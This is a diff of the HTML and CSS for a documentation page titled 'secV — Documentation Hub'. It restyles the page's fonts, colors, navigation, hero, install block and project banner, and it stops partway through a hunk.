@@ -3,205 +3,226 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>secV - Documentation Hub</title>
+<title>secV — Documentation Hub</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
 <style>
 *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-html { scroll-behavior: smooth; -webkit-font-smoothing: antialiased; }
+html { scroll-behavior: smooth; }
 
 :root {
-  --bg:      #060606;
-  --bg1:     #0e0e0e;
-  --bg2:     #161616;
-  --bg3:     #1e1e1e;
-  --bg4:     #282828;
-  --border:  rgba(255,255,255,0.06);
-  --border2: rgba(255,255,255,0.12);
-  --border3: rgba(255,255,255,0.22);
-  --text:    #a2a2a2;
-  --muted:   #4e4e4e;
-  --dim:     #242424;
-  --white:   #efefef;
-  --off:     #cccccc;
-  --grey:    #727272;
-  --mono:    'JetBrains Mono', monospace;
-  --disp:    'Syne', sans-serif;
-  --t:       0.15s ease;
-  /* transparency tokens */
-  --glass:   rgba(14,14,14,0.55);
-  --glass2:  rgba(22,22,22,0.45);
-  --glass3:  rgba(6,6,6,0.35);
+  --black:   #080808;
+  --deep:    #0e0e0e;
+  --pit:     #141414;
+  --slab:    #1a1a1a;
+  --wall:    #222;
+  --crack:   #2e2e2e;
+  --stone:   #3a3a3a;
+  --dust:    #555;
+  --fog:     #888;
+  --ash:     #bbb;
+  --white:   #f0ede6;
+  --disp:    'Bebas Neue', sans-serif;
+  --mono:    'Space Mono', monospace;
+  --bw:      2px;
+  --r:       10px;
+  --r-sm:    6px;
+  --r-lg:    16px;
+  --t:       0.12s ease;
+  --tt:      0.22s ease;
 }
 
 body {
   font-family: var(--mono);
-  background: var(--bg);
-  color: var(--text);
-  line-height: 1.7;
+  background: var(--black);
+  color: var(--ash);
+  line-height: 1.65;
   overflow-x: hidden;
-  min-height: 100vh;
 }
 
-/* ── Subtle background glow ── */
-body::after {
+/* grain */
+body::before {
   content: '';
   position: fixed;
   inset: 0;
-  z-index: 0;
-  background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(255,255,255,0.025) 0%, transparent 70%);
+  z-index: 999;
   pointer-events: none;
+  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.045'/%3E%3C/svg%3E");
+  background-size: 256px;
+  opacity: 0.55;
+  mix-blend-mode: overlay;
 }
 
-/* ensure content stacks above bg layers */
-nav, .hero, .wrap, hr.rule, footer { position: relative; z-index: 1; }
+::-webkit-scrollbar { width: 3px; }
+::-webkit-scrollbar-track { background: var(--black); }
+::-webkit-scrollbar-thumb { background: var(--stone); border-radius: 2px; }
 
-::-webkit-scrollbar { width: 4px; }
-::-webkit-scrollbar-track { background: var(--bg); }
-::-webkit-scrollbar-thumb { background: var(--bg3); border-radius: 2px; }
-
-/* ── Nav ── */
+/* ─── NAV ─── */
 nav {
   position: fixed;
-  top: 0; left: 0; right: 0;
-  z-index: 100;
+  top: 12px; left: 50%;
+  transform: translateX(-50%);
+  width: calc(100% - 3rem);
+  max-width: 1100px;
+  z-index: 500;
   height: 52px;
   display: flex;
   align-items: center;
   justify-content: space-between;
-  padding: 0 2.5rem;
-  border-bottom: 1px solid transparent;
-  transition: border-color 0.3s, background 0.3s;
+  padding: 0 1.5rem;
+  border: var(--bw) solid var(--wall);
+  background: rgba(8,8,8,0.92);
+  backdrop-filter: blur(16px);
+  border-radius: var(--r);
+  transition: border-color var(--tt);
 }
-nav.scrolled {
-  background: rgba(6,6,6,0.72);
-  backdrop-filter: blur(20px) saturate(1.2);
-  -webkit-backdrop-filter: blur(20px) saturate(1.2);
-  border-color: var(--border2);
-}
+nav.scrolled { border-color: var(--ash); }
+
 .logo {
   font-family: var(--disp);
-  font-size: 0.92rem;
-  font-weight: 800;
+  font-size: 1.4rem;
+  letter-spacing: 0.06em;
   color: var(--white);
   text-decoration: none;
-  letter-spacing: -0.02em;
   display: flex;
   align-items: center;
   gap: 0.5rem;
 }
-.logo-sep { color: var(--muted); font-weight: 400; }
-.logo-sub { color: var(--grey); font-weight: 400; font-size: 0.82rem; }
-.nav-links { display: flex; align-items: center; gap: 0.25rem; }
+.logo-sq {
+  width: 8px; height: 8px;
+  background: var(--white);
+  transform: rotate(45deg);
+  animation: spin-sq 4s linear infinite;
+  flex-shrink: 0;
+}
+@keyframes spin-sq { to { transform: rotate(405deg); } }
+.logo-sep { color: var(--dust); font-family: var(--mono); font-size: 0.9rem; }
+.logo-sub { color: var(--fog); font-family: var(--mono); font-size: 0.65rem; letter-spacing: 0.1em; }
+
+.nav-links { display: flex; align-items: center; gap: 2px; }
 .nav-link {
-  font-size: 0.6rem;
-  letter-spacing: 0.1em;
+  font-size: 0.5rem;
+  letter-spacing: 0.16em;
   text-transform: uppercase;
-  color: var(--muted);
+  color: var(--dust);
   text-decoration: none;
   padding: 0.4rem 0.75rem;
-  transition: color var(--t);
+  border-radius: var(--r-sm);
+  transition: color var(--t), background var(--t);
 }
-.nav-link:hover { color: var(--text); }
-.nav-btn {
-  font-size: 0.6rem;
-  letter-spacing: 0.1em;
+.nav-link:hover { color: var(--ash); background: rgba(255,255,255,0.06); }
+.nav-cta {
+  font-size: 0.5rem;
+  letter-spacing: 0.16em;
   text-transform: uppercase;
-  color: var(--text);
+  color: var(--black);
+  background: var(--white);
   text-decoration: none;
-  padding: 0.4rem 0.9rem;
-  border: 1px solid var(--border2);
+  padding: 0.4rem 1rem;
   margin-left: 0.5rem;
-  transition: border-color var(--t), color var(--t);
+  font-weight: 700;
+  border-radius: var(--r-sm);
+  transition: background var(--t);
 }
-.nav-btn:hover { border-color: var(--border3); color: var(--white); }
+.nav-cta:hover { background: var(--ash); }
 
 .burger {
   display: none;
   background: none;
-  border: 1px solid var(--border2);
-  padding: 0.38rem 0.55rem;
-  cursor: pointer;
+  border: var(--bw) solid var(--wall);
+  padding: 0.35rem 0.5rem;
   flex-direction: column;
   gap: 4px;
-  border-radius: 2px;
+  border-radius: var(--r-sm);
 }
-.burger span { display: block; width: 18px; height: 1px; background: var(--text); transition: transform var(--t), opacity var(--t); }
-body.nav-open .burger span:nth-child(1) { transform: rotate(45deg) translate(3.5px,3.5px); }
-body.nav-open .burger span:nth-child(2) { opacity: 0; }
-body.nav-open .burger span:nth-child(3) { transform: rotate(-45deg) translate(3.5px,-3.5px); }
+.burger span { display: block; width: 18px; height: 1.5px; background: var(--ash); }
 
-/* ── Hero ── */
+/* ─── HERO ─── */
 .hero {
-  padding: 9rem 2.5rem 5.5rem;
-  max-width: 1020px;
+  padding: 9rem 2.5rem 5rem;
+  max-width: 1100px;
   margin: 0 auto;
+  position: relative;
+  z-index: 1;
 }
+
 .breadcrumb {
-  font-size: 0.54rem;
-  letter-spacing: 0.18em;
-  text-transform: uppercase;
-  color: var(--muted);
-  margin-bottom: 2.5rem;
   display: flex;
   align-items: center;
   gap: 0.6rem;
+  font-size: 0.5rem;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--dust);
+  margin-bottom: 2.5rem;
   flex-wrap: wrap;
 }
-.breadcrumb a { color: var(--muted); text-decoration: none; transition: color var(--t); }
-.breadcrumb a:hover { color: var(--text); }
-.breadcrumb span { color: var(--dim); }
+.breadcrumb a { color: var(--dust); text-decoration: none; transition: color var(--t); }
+.breadcrumb a:hover { color: var(--ash); }
+.breadcrumb-sep { color: var(--wall); }
 
 h1 {
   font-family: var(--disp);
-  font-size: clamp(2.8rem, 6vw, 4.5rem);
-  font-weight: 800;
-  letter-spacing: -0.05em;
+  font-size: clamp(5rem, 10vw, 9rem);
+  line-height: 0.88;
+  letter-spacing: 0.02em;
   color: var(--white);
-  line-height: 0.95;
-  margin-bottom: 1.5rem;
+  margin-bottom: 1.25rem;
+  text-shadow:
+    1px 1px 0 var(--stone),
+    2px 2px 0 var(--stone),
+    3px 3px 0 rgba(60,60,60,0.7),
+    4px 4px 0 rgba(40,40,40,0.5),
+    5px 5px 0 rgba(20,20,20,0.35),
+    7px 7px 15px rgba(0,0,0,0.9);
 }
-h1 em { font-style: normal; color: var(--muted); }
+h1 em {
+  font-style: normal;
+  color: var(--fog);
+  display: block;
+  font-size: 0.55em;
+  letter-spacing: 0.06em;
+  text-shadow: none;
+}
 
 .hero-sub {
-  font-size: 0.84rem;
-  color: var(--muted);
-  max-width: 560px;
+  font-size: 0.76rem;
+  color: var(--fog);
+  max-width: 580px;
   line-height: 1.9;
-  margin-bottom: 2.75rem;
+  margin-bottom: 2.5rem;
 }
 
-/* ── Install block ── */
+/* install block */
 .install-block {
   display: flex;
   align-items: center;
-  background: var(--glass);
-  backdrop-filter: blur(12px);
-  -webkit-backdrop-filter: blur(12px);
-  border: 1px solid var(--border2);
-  max-width: 580px;
-  margin-bottom: 3.5rem;
+  background: var(--slab);
+  border: var(--bw) solid var(--wall);
+  border-top: var(--bw) solid var(--ash);
+  max-width: 600px;
+  border-radius: var(--r);
   overflow: hidden;
-  transition: border-color 0.2s, background 0.2s;
+  transition: border-color var(--tt), box-shadow var(--tt);
 }
 .install-block:hover {
-  background: var(--glass2);
-  border-color: var(--border3);
+  border-color: var(--ash);
+  box-shadow: 0 8px 32px rgba(0,0,0,0.5);
 }
 .install-label {
-  font-size: 0.5rem;
-  letter-spacing: 0.16em;
+  font-size: 0.45rem;
+  letter-spacing: 0.2em;
   text-transform: uppercase;
-  color: var(--muted);
-  padding: 0.8rem 1rem;
-  border-right: 1px solid var(--border2);
+  color: var(--dust);
+  padding: 0.85rem 1rem;
+  border-right: 1px solid var(--wall);
   white-space: nowrap;
   flex-shrink: 0;
 }
 .install-cmd {
-  font-size: 0.74rem;
+  font-size: 0.68rem;
   color: var(--white);
-  padding: 0.8rem 1.1rem;
+  padding: 0.85rem 1.1rem;
   flex: 1;
   overflow: hidden;
   white-space: nowrap;
@@ -210,585 +231,86 @@ h1 em { font-style: normal; color: var(--muted); }
 .install-copy {
   background: none;
   border: none;
-  border-left: 1px solid var(--border2);
-  padding: 0.8rem 1rem;
-  cursor: pointer;
-  color: var(--muted);
+  border-left: 1px solid var(--wall);
+  padding: 0.85rem 1rem;
+  color: var(--dust);
   transition: color var(--t), background var(--t);
   flex-shrink: 0;
 }
-.install-copy:hover { color: var(--white); background: var(--bg2); }
+.install-copy:hover { color: var(--white); background: var(--pit); }
 
-/* ── Section layout ── */
+/* ─── LAYOUT ─── */
 .wrap {
-  max-width: 1020px;
+  max-width: 1100px;
   margin: 0 auto;
-  padding: 4rem 2.5rem 5rem;
+  padding: 5rem 2.5rem;
+  position: relative;
+  z-index: 1;
 }
-.rule { border: none; border-top: 1px solid var(--border); }
+hr.rule {
+  border: none;
+  border-top: 1px solid var(--wall);
+  position: relative;
+  z-index: 1;
+}
 
+/* section labels */
 .section-label {
-  font-size: 0.5rem;
-  letter-spacing: 0.24em;
-  text-transform: uppercase;
-  color: var(--muted);
-  margin-bottom: 0.6rem;
   display: flex;
   align-items: center;
   gap: 0.75rem;
+  font-size: 0.45rem;
+  letter-spacing: 0.28em;
+  text-transform: uppercase;
+  color: var(--dust);
+  margin-bottom: 0.6rem;
 }
-.section-label::before {
-  content: '';
-  display: inline-block;
-  width: 20px; height: 1px;
-  background: var(--muted);
+.section-num {
+  font-size: 0.42rem;
+  letter-spacing: 0.25em;
+  color: var(--ash);
+  border: 1px solid var(--wall);
+  padding: 0.12rem 0.4rem;
+  border-radius: 3px;
+}
+.section-line {
+  flex: 1;
+  height: 1px;
+  background: linear-gradient(to right, var(--wall), transparent);
 }
 
 h2 {
   font-family: var(--disp);
-  font-size: clamp(1.5rem, 3vw, 2.2rem);
-  font-weight: 800;
-  letter-spacing: -0.04em;
+  font-size: clamp(2.8rem, 5vw, 4.5rem);
+  letter-spacing: 0.03em;
   color: var(--white);
-  margin-bottom: 2.5rem;
+  line-height: 0.92;
+  margin-bottom: 2rem;
 }
+.h2-stroke { -webkit-text-stroke: 2px var(--white); color: transparent; }
 
 h3 {
   font-family: var(--disp);
-  font-size: 1.1rem;
-  font-weight: 700;
-  letter-spacing: -0.02em;
+  font-size: 1.6rem;
+  letter-spacing: 0.04em;
   color: var(--white);
+  margin-top: 3rem;
   margin-bottom: 1rem;
-  margin-top: 2.5rem;
 }
 
-/* ── Active project banner ── */
+/* ─── PROJECT BANNER ─── */
 .project-banner {
   display: flex;
   align-items: center;
   justify-content: space-between;
   gap: 1.5rem;
-  padding: 1rem 1.4rem;
-  background: var(--glass);
-  backdrop-filter: blur(12px);
-  -webkit-backdrop-filter: blur(12px);
-  border: 1px solid var(--border2);
-  border-left: 3px solid var(--white);
+  padding: 1.25rem 1.5rem;
+  background: var(--slab);
+  border: var(--bw) solid var(--wall);
+  border-top: var(--bw) solid var(--ash);
+  border-radius: var(--r);
   margin-bottom: 2.5rem;
   flex-wrap: wrap;
-}
-.project-banner-left { display: flex; align-items: center; gap: 1rem; }
-.project-banner-dot {
-  width: 7px; height: 7px;
-  background: var(--white);
-  border-radius: 50%;
-  flex-shrink: 0;
-  animation: blink 2.5s ease infinite;
-}
-@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
-.project-banner-label {
-  font-size: 0.52rem;
-  letter-spacing: 0.18em;
-  text-transform: uppercase;
-  color: var(--muted);
-}
-.project-banner-name {
-  font-family: var(--disp);
-  font-size: 0.9rem;
-  font-weight: 700;
-  color: var(--white);
-}
-.project-banner-meta {
-  font-size: 0.62rem;
-  color: var(--muted);
-  display: flex;
-  gap: 1.25rem;
-  flex-wrap: wrap;
-}
-.project-banner-meta span { display: flex; align-items: center; gap: 0.35rem; }
-
-/* ── Module cards ── */
-.module-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
-  gap: 1px;
-  background: var(--border);
-  border: 1px solid var(--border);
-  margin-bottom: 2rem;
-}
-.module-card {
-  background: var(--glass3);
-  backdrop-filter: blur(8px);
-  -webkit-backdrop-filter: blur(8px);
-  padding: 1.8rem;
-  position: relative;
-  transition: background 0.25s, transform 0.22s cubic-bezier(0.34,1.4,0.64,1), box-shadow 0.22s ease, z-index 0s;
-  text-decoration: none;
-  display: block;
-  overflow: hidden;
-  z-index: 0;
-}
-/* shimmer sweep on hover */
-.module-card::after {
-  content: '';
-  position: absolute;
-  inset: 0;
-  background: linear-gradient(115deg, transparent 40%, rgba(255,255,255,0.04) 50%, transparent 60%);
-  transform: translateX(-100%);
-  transition: transform 0.45s ease;
-  pointer-events: none;
-}
-.module-card:hover::after { transform: translateX(100%); }
-.module-card::before {
-  content: '';
-  position: absolute;
-  left: 0; top: 0; bottom: 0;
-  width: 2px;
-  background: var(--white);
-  opacity: 0;
-  transition: opacity 0.2s;
-}
-.module-card:hover {
-  background: rgba(22,22,22,0.72);
-  transform: scale(1.033);
-  box-shadow: 0 8px 32px rgba(0,0,0,0.55), 0 0 0 1px var(--border2);
-  z-index: 2;
-}
-.module-card:hover::before { opacity: 1; }
-.module-card.wip::before { background: var(--grey); }
-
-.mod-status {
-  font-size: 0.48rem;
-  letter-spacing: 0.16em;
-  text-transform: uppercase;
-  padding: 0.12rem 0.45rem;
-  display: inline-flex;
-  align-items: center;
-  gap: 0.4rem;
-  margin-bottom: 1rem;
-  border: 1px solid transparent;
-}
-.mod-status::before {
-  content: '';
-  display: inline-block;
-  width: 5px; height: 5px;
-  border-radius: 50%;
-  flex-shrink: 0;
-}
-.status-stable { color: var(--off); border-color: var(--border2); background: rgba(255,255,255,0.04); }
-.status-stable::before { background: var(--white); }
-.status-beta { color: #b89a48; border-color: rgba(184,154,72,0.2); background: rgba(184,154,72,0.06); }
-.status-beta::before { background: #b89a48; }
-.status-wip { color: var(--muted); border-color: var(--border); background: transparent; }
-.status-wip::before { background: var(--muted); }
-
-.mod-name {
-  font-family: var(--disp);
-  font-size: 1.15rem;
-  font-weight: 700;
-  color: var(--white);
-  margin-bottom: 0.4rem;
-  letter-spacing: -0.02em;
-}
-.mod-category { font-size: 0.54rem; letter-spacing: 0.14em; text-transform: uppercase; color: var(--muted); margin-bottom: 0.85rem; }
-.mod-desc { font-size: 0.76rem; color: var(--text); line-height: 1.75; margin-bottom: 1.4rem; }
-.mod-tags { display: flex; flex-wrap: wrap; gap: 0.3rem; }
-.tag {
-  font-size: 0.48rem;
-  letter-spacing: 0.1em;
-  text-transform: uppercase;
-  color: var(--muted);
-  padding: 0.12rem 0.5rem;
-  border: 1px solid var(--border);
-  transition: border-color var(--t), color var(--t);
-}
-.module-card:hover .tag { border-color: var(--border2); }
-.mod-arrow {
-  position: absolute;
-  right: 1.5rem; bottom: 1.5rem;
-  font-size: 0.78rem;
-  color: var(--muted);
-  opacity: 0;
-  transition: opacity 0.15s, transform 0.15s;
-}
-.module-card:hover .mod-arrow { opacity: 1; transform: translateX(4px); }
-
-/* ── Shell reference ── */
-.shell-section {
-  margin-bottom: 4.5rem;
-  transition: transform 0.22s cubic-bezier(0.34,1.3,0.64,1);
-}
-.shell-section:hover { transform: scale(1.008); }
-.shell-header {
-  display: flex;
-  align-items: center;
-  gap: 1rem;
-  margin-bottom: 1.5rem;
-  padding-bottom: 1rem;
-  border-bottom: 1px solid var(--border);
-}
-.shell-title {
-  font-family: var(--disp);
-  font-size: 1.05rem;
-  font-weight: 700;
-  color: var(--white);
-  letter-spacing: -0.01em;
-}
-.shell-version {
-  font-size: 0.5rem;
-  letter-spacing: 0.14em;
-  color: var(--muted);
-  padding: 0.12rem 0.55rem;
-  border: 1px solid var(--border);
-}
-
-.cmd-table { width: 100%; border-collapse: collapse; }
-.cmd-table tr { border-bottom: 1px solid var(--border); }
-.cmd-table tr:last-child { border-bottom: none; }
-.cmd-table td { padding: 0.7rem 0.85rem; font-size: 0.74rem; vertical-align: top; line-height: 1.65; }
-.cmd-table td:first-child { color: var(--white); white-space: nowrap; width: 38%; }
-.cmd-table td:last-child { color: var(--muted); }
-.cmd-group-header td {
-  font-size: 0.48rem;
-  letter-spacing: 0.2em;
-  text-transform: uppercase;
-  color: var(--muted);
-  padding-top: 1.4rem;
-  padding-bottom: 0.4rem;
-  border-bottom: none;
-  background: none;
-}
-.cmd-table tr:hover td { background: var(--bg1); }
-.cmd-table .cmd-group-header:hover td { background: transparent; }
-.cmd-table code { font-size: 0.7rem; color: var(--off); background: var(--bg2); border: 1px solid var(--border); padding: 0.05rem 0.3rem; }
-
-/* ── Prose body text ── */
-.body-text {
-  font-size: 0.78rem;
-  color: var(--text);
-  line-height: 1.9;
-  margin-bottom: 1.6rem;
-  max-width: 760px;
-}
-.body-text a { color: var(--off); text-decoration: none; border-bottom: 1px solid var(--border2); transition: color var(--t), border-color var(--t); }
-.body-text a:hover { color: var(--white); border-color: var(--text); }
-
-/* ── Architecture diagram ── */
-.arch-flow {
-  display: flex;
-  align-items: center;
-  gap: 0;
-  flex-wrap: wrap;
-  margin: 2rem 0;
-  border: 1px solid var(--border);
-  background: var(--glass);
-  backdrop-filter: blur(10px);
-  -webkit-backdrop-filter: blur(10px);
-  overflow: hidden;
-}
-.arch-node {
-  flex: 1;
-  min-width: 120px;
-  padding: 1.2rem 1.4rem;
-  border-right: 1px solid var(--border);
-  text-align: center;
-  transition: background 0.2s, transform 0.22s cubic-bezier(0.34,1.4,0.64,1);
-  position: relative;
-  z-index: 0;
-}
-.arch-node:last-child { border-right: none; }
-.arch-node:hover {
-  background: rgba(255,255,255,0.03);
-  transform: scale(1.05);
-  z-index: 2;
-}
-.arch-node-label {
-  font-size: 0.46rem;
-  letter-spacing: 0.18em;
-  text-transform: uppercase;
-  color: var(--muted);
-  margin-bottom: 0.4rem;
-}
-.arch-node-name {
-  font-family: var(--disp);
-  font-size: 0.88rem;
-  font-weight: 700;
-  color: var(--white);
-  margin-bottom: 0.25rem;
-}
-.arch-node-detail {
-  font-size: 0.6rem;
-  color: var(--muted);
-  line-height: 1.6;
-}
-.arch-arrow {
-  font-size: 1rem;
-  color: var(--muted);
-  padding: 0 0.2rem;
-  flex-shrink: 0;
-}
-
-/* ── Info cards ── */
-.info-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
-  gap: 1px;
-  background: var(--border);
-  border: 1px solid var(--border);
-  margin: 1.5rem 0 2.5rem;
-}
-.info-card {
-  background: var(--glass3);
-  backdrop-filter: blur(8px);
-  -webkit-backdrop-filter: blur(8px);
-  padding: 1.4rem 1.6rem;
-  transition: background 0.2s, transform 0.22s cubic-bezier(0.34,1.4,0.64,1), box-shadow 0.22s ease;
-  z-index: 0;
-  position: relative;
-}
-.info-card:hover {
-  background: var(--glass2);
-  transform: scale(1.03);
-  box-shadow: 0 6px 24px rgba(0,0,0,0.5), 0 0 0 1px var(--border2);
-  z-index: 2;
-}
-.info-card-num {
-  font-family: var(--disp);
-  font-size: 1.8rem;
-  font-weight: 800;
-  color: var(--dim);
-  letter-spacing: -0.04em;
-  margin-bottom: 0.5rem;
-}
-.info-card-title {
-  font-size: 0.72rem;
-  font-weight: 600;
-  color: var(--white);
-  margin-bottom: 0.4rem;
-}
-.info-card-body { font-size: 0.66rem; color: var(--muted); line-height: 1.7; }
-
-/* ── Pre / code ── */
-pre {
-  background: var(--glass);
-  backdrop-filter: blur(8px);
-  -webkit-backdrop-filter: blur(8px);
-  border: 1px solid var(--border);
-  border-left: 3px solid var(--border2);
-  padding: 1rem 1.25rem;
-  font-size: 0.75rem;
-  overflow-x: auto;
-  color: var(--text);
-  margin: 0.8rem 0 1.6rem;
-  line-height: 1.75;
-  border-radius: 0 2px 2px 0;
-}
-code { font-family: var(--mono); }
-.hl  { color: var(--white); }
-.cm  { color: var(--muted); font-style: italic; }
-.kw  { color: #8aabcc; }
-.st  { color: #b89a48; }
-.nu  { color: #a89060; }
-
-/* ── Notice / callout ── */
-.callout {
-  border: 1px solid var(--border2);
-  border-left: 3px solid var(--white);
-  background: var(--glass);
-  backdrop-filter: blur(8px);
-  -webkit-backdrop-filter: blur(8px);
-  padding: 0.9rem 1.2rem;
-  font-size: 0.72rem;
-  color: var(--text);
-  line-height: 1.8;
-  margin: 1.4rem 0 2rem;
-}
-.callout strong { color: var(--white); }
-.callout.warn { border-left-color: #b89a48; }
-.callout.warn strong { color: #b89a48; }
-
-/* ── Chain diagram ── */
-.chain {
-  display: flex;
-  flex-direction: column;
-  gap: 0;
-  border: 1px solid var(--border);
-  margin: 1.5rem 0 2rem;
-}
-.chain-step {
-  display: grid;
-  grid-template-columns: 2.5rem 1fr;
-  gap: 1rem;
-  padding: 1rem 1.2rem;
-  border-bottom: 1px solid var(--border);
-  align-items: start;
-  background: var(--bg);
-  transition: background var(--t);
-}
-.chain-step:last-child { border-bottom: none; }
-.chain-step:hover { background: var(--bg1); }
-.chain-num {
-  font-family: var(--disp);
-  font-size: 0.7rem;
-  font-weight: 800;
-  color: var(--muted);
-  letter-spacing: -0.02em;
-  padding-top: 0.1rem;
-}
-.chain-content-title { font-size: 0.76rem; font-weight: 600; color: var(--white); margin-bottom: 0.25rem; }
-.chain-content-body { font-size: 0.68rem; color: var(--muted); line-height: 1.65; }
-.chain-content-code { font-family: var(--mono); font-size: 0.64rem; color: var(--off); background: var(--bg2); border: 1px solid var(--border); padding: 0.04rem 0.3rem; }
-
-/* ── Two-col layout ── */
-.two-col {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 1.5rem;
-  margin: 1.5rem 0 2rem;
-}
-@media (max-width: 680px) { .two-col { grid-template-columns: 1fr; } }
-.col-card {
-  background: var(--glass);
-  backdrop-filter: blur(8px);
-  -webkit-backdrop-filter: blur(8px);
-  border: 1px solid var(--border);
-  padding: 1.4rem;
-  transition: background 0.2s, border-color 0.2s, transform 0.22s cubic-bezier(0.34,1.4,0.64,1), box-shadow 0.22s ease;
-  position: relative;
-  z-index: 0;
-}
-.col-card:hover {
-  background: var(--glass2);
-  border-color: var(--border2);
-  transform: scale(1.03);
-  box-shadow: 0 6px 24px rgba(0,0,0,0.5);
-  z-index: 2;
-}
-.col-card-title {
-  font-size: 0.62rem;
-  letter-spacing: 0.14em;
-  text-transform: uppercase;
-  color: var(--muted);
-  margin-bottom: 0.8rem;
-  padding-bottom: 0.6rem;
-  border-bottom: 1px solid var(--border);
-}
-.col-card-body { font-size: 0.7rem; color: var(--text); line-height: 1.8; }
-
-/* ── Param table ── */
-.param-table { width: 100%; border-collapse: collapse; margin: 1rem 0 2rem; }
-.param-table th {
-  font-size: 0.46rem;
-  letter-spacing: 0.18em;
-  text-transform: uppercase;
-  color: var(--muted);
-  padding: 0.5rem 0.8rem;
-  text-align: left;
-  border-bottom: 1px solid var(--border2);
-  font-weight: 400;
-}
-.param-table td { padding: 0.65rem 0.8rem; font-size: 0.72rem; vertical-align: top; border-bottom: 1px solid var(--border); line-height: 1.6; }
-.param-table td:first-child { color: var(--white); font-family: var(--mono); }
-.param-table td:nth-child(2) { color: var(--muted); font-size: 0.65rem; }
-.param-table td:last-child { color: var(--text); }
-.param-table tr:last-child td { border-bottom: none; }
-.param-table tr:hover td { background: var(--bg1); }
-.req-yes { color: var(--off); }
-.req-no  { color: var(--muted); }
-
-/* ── Quickstart steps ── */
-.quickstart { margin-bottom: 2rem; }
-.steps { display: flex; flex-direction: column; }
-.step {
-  display: grid;
-  grid-template-columns: 3.5rem 1fr;
-  gap: 1.25rem;
-  padding: 1.5rem 0;
-  border-bottom: 1px solid var(--border);
-  align-items: start;
-}
-.step:last-child { border-bottom: none; }
-.step-num {
-  font-family: var(--disp);
-  font-size: 1.6rem;
-  font-weight: 800;
-  color: var(--dim);
-  line-height: 1.1;
-  letter-spacing: -0.04em;
-  padding-top: 0.1rem;
-}
-.step-title { font-size: 0.84rem; font-weight: 600; color: var(--white); margin-bottom: 0.4rem; }
-.step-body { font-size: 0.74rem; color: var(--muted); line-height: 1.75; margin-bottom: 0.6rem; }
-
-/* ── Footer ── */
-footer {
-  border-top: 1px solid var(--border);
-  padding: 1.75rem 2.5rem;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  flex-wrap: wrap;
-  gap: 1rem;
-  max-width: 1020px;
-  margin: 0 auto;
-}
-.foot-brand { font-family: var(--disp); font-size: 0.88rem; font-weight: 700; color: var(--muted); text-decoration: none; letter-spacing: -0.02em; }
-.foot-links { display: flex; gap: 1.75rem; }
-.foot-link { font-size: 0.54rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); text-decoration: none; transition: color var(--t); }
-.foot-link:hover { color: var(--text); }
-.foot-note { font-size: 0.5rem; color: var(--dim); letter-spacing: 0.06em; }
-
-/* ── Animations ── */
-@keyframes rise {
-  from { opacity: 0; transform: translateY(14px); }
-  to   { opacity: 1; transform: none; }
-}
-@keyframes fadeIn {
-  from { opacity: 0; }
-  to   { opacity: 1; }
-}
-@keyframes scanline {
-  0%   { top: -8%; opacity: 0; }
-  10%  { opacity: 0.04; }
-  90%  { opacity: 0.04; }
-  100% { top: 108%; opacity: 0; }
-}
-
-/* hero entrance */
-.hero h1        { animation: rise 0.6s 0.06s ease both; }
-.hero .hero-sub { animation: rise 0.6s 0.18s ease both; }
-.hero .install-block { animation: rise 0.6s 0.3s ease both; }
-.breadcrumb     { animation: fadeIn 0.5s 0.05s ease both; }
-
-/* subtle scanline sweep over hero */
-.hero {
-  overflow: hidden;
-}
-.hero::after {
-  content: '';
-  position: absolute;
-  left: 0; right: 0;
-  height: 8%;
-  background: linear-gradient(to bottom, transparent, rgba(255,255,255,0.018), transparent);
-  animation: scanline 7s 1.2s ease-in-out infinite;
-  pointer-events: none;
-  z-index: 2;
-}
-
-/* scroll-reveal base state */
-.reveal {
-  opacity: 0;
-  transform: translateY(18px);
-  transition: opacity 0.55s ease, transform 0.55s ease;
-}
-.reveal.in-view {
-  opacity: 1;
-  transform: none;
-}
-
-/* project banner pulse glow */
-.project-banner {
   position: relative;
   overflow: hidden;
 }
@@ -796,91 +318,538 @@ footer {
   content: '';
   position: absolute;
   inset: 0;
-  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.018), transparent);
-  animation: bannerGlow 4s ease-in-out infinite;
+  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.015), transparent);
+  animation: banner-sweep 5s ease-in-out infinite;
   pointer-events: none;
 }
-@keyframes bannerGlow {
-  0%, 100% { opacity: 0; }
-  50% { opacity: 1; }
+@keyframes banner-sweep {
+  0%,100% { transform: translateX(-100%); opacity: 0; }
+  50% { transform: translateX(100%); opacity: 1; }
+}
+.banner-left { display: flex; align-items: center; gap: 1rem; }
+.banner-dot {
+  width: 7px; height: 7px;
+  background: var(--white);
+  border-radius: 50%;
+  flex-shrink: 0;
+  animation: breathe 2.5s ease-in-out infinite;
+}
+@keyframes breathe { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.3;transform:scale(0.5)} }
+.banner-tag {
+  font-size: 0.44rem;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--dust);
+}
+.banner-name {
+  font-family: var(--disp);
+  font-size: 1.1rem;
+  letter-spacing: 0.04em;
+  color: var(--white);
+}
+.banner-meta {
+  display: flex;
+  gap: 1.5rem;
+  font-size: 0.58rem;
+  color: var(--dust);
+  letter-spacing: 0.08em;
